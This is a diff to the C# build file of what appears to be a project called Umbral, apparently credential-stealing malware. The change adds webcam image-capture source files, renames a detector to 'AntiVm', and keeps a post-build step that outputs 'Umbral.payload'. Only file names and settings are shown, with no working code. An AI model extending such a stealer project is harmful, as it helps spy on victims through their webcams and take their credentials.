@@ -43,7 +43,7 @@
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
-    <PlatformTarget>x64</PlatformTarget>
+    <PlatformTarget>AnyCPU</PlatformTarget>
     <DebugType>pdbonly</DebugType>
     <Optimize>true</Optimize>
     <OutputPath>bin\Release\</OutputPath>
@@ -117,6 +117,7 @@
     <Compile Include="Handlers\AesGcm.cs" />
     <Compile Include="Handlers\BCrypt.cs" />
     <Compile Include="Handlers\SQLiteHandler.cs" />
+    <Compile Include="Handlers\WebcamHandler.cs" />
     <Compile Include="Postman\PayloadGen.cs" />
     <Compile Include="Handlers\SimpleJson.cs" />
     <Compile Include="Utilities\SaveData.cs" />
@@ -128,9 +129,10 @@
     <Compile Include="SystemInfo\IpInfo.cs" />
     <Compile Include="Utilities\Common.cs" />
     <Compile Include="Utilities\Syscalls.cs" />
-    <Compile Include="Vmprotect\Detector.cs" />
+    <Compile Include="AntiVm\Detector.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Webcam\ImageCapture.cs" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include=".NETFramework,Version=v4.7.2">
@@ -147,6 +149,7 @@
   <ItemGroup>
     <None Include="App.config" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)\Umbral.payload"
